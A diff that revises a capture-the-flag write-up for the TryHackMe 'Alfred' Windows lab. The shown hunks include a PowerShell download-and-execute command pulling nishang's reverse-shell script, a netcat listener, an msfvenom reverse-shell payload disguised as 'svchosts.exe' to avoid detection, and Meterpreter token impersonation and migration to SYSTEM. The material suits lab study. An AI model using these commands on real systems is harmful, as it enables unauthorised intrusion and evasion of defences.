@@ -88,7 +88,7 @@ C:\Program Files (x86)\Jenkins\workspace\project>exit 0
 Finished: SUCCESS
 ```
 
-So it looks like Jenkins executes the commands as system but has access to a user (alfred/bruce) if we were to get a shell. Let's check and see if we can use powershell. We're in luck, the cmd can launch powershell. Let's use [nishang](https://github.com/samratashok/nishang) and transfer Invoke-PowerShellTcp.ps1 to the server using Jenkins and a Simple HTTP server. We will want to launch a netcat listener before we do this, to pickup the shell.
+So it looks like Jenkins executes the commands as system but has access to a user (alfred/bruce) if we were to get a shell. Let's check and see if we can use powershell. We're in luck, the cmd can launch powershell. Let's use [nishang](https://github.com/samratashok/nishang) and transfer Invoke-PowerShellTcp.ps1 to the server using Jenkins and a HTTP server. We will want to launch a netcat listener before we do this, to pickup the shell.
 
 * Move the terminals location to the directory containing Invoke-PowerShellTcp.ps1 and start the server (I made one for this room named Alfred).
 
@@ -111,7 +111,7 @@ powershell iex (New-Object Net.WebClient).DownloadString('http://Tun0-IP:8000/In
 WIN!
 
 ```
-rlwrap nc -lvnp 4444                                                                                                                                        9 ⚙
+rlwrap nc -lvnp 4444
 listening on [any] 4444 ...
 connect to [Tun0-IP] from (UNKNOWN) [10.10.27.251] 49355
 ```
@@ -124,15 +124,15 @@ PS C:\Program Files (x86)\Jenkins\workspace\project>systeminfo
 
 **What is the user.txt flag?**
 
-Now, we can begin looking for the user.txt flag! Use type user.txt to read the file in powershell.
+Now, we can begin looking for the user.txt flag! Start by checking desktop and documents. Then use type user.txt to read the file in powershell.
 
 ## Task 2: Switching Shells
 
 Now it's time to try and escalate our privileges. First, lets get an improved shell on the device. We are going to use msfvenom to create a reverse shell payload. We should encode it and name it similarly to a legitimate binary service to avoid detection.
 
-'''
+```
 msfvenom -p windows/shell_reverse_tcp LHOST=Tun0-IP LPORT=5555 -e x86/shikata_ga_nai -f exe -o svchosts.exe  
-'''
+```
 
 **What is the final size of the exe payload that you generated?**
 
@@ -171,13 +171,13 @@ impersonate_token "BUILTIN\Administrators"
 getuid
 ```
 
-Rooted! We were able to escalate to NT AUTHORITY\SYSTEM by impersonating an Administrator [token](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens). However, we might not have the permissions of system yet.
+Rooted! We were able to escalate to NT AUTHORITY\SYSTEM by impersonating an Administrator [token](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens). However, we might not have the permissions of system yet due to the primary token.
 
-["this is due to the way Windows handles permissions - it uses the Primary Token of the process and not the impersonated token to determine what the process can or cannot do"](https://tryhackme.com/room/alfred). 
+["this is due to the way Windows handles permissions - it uses the Primary Token of the process and not the impersonated token to determine what the process can or cannot do"](https://tryhackme.com/room/alfred) 
 
 Due to this, we must migrate to a process that has SYSTEM permissions.
 
-We can do this by using ps to find a PID to migrate to that is running as SYSTEM. We are going to use services.exe.
+We can do this by using ps to find a PID and migrate to it if it is running as SYSTEM. After reviewing the processes, we are going to use services.exe for its primary token.
 
 ```
 migrate services.exePID
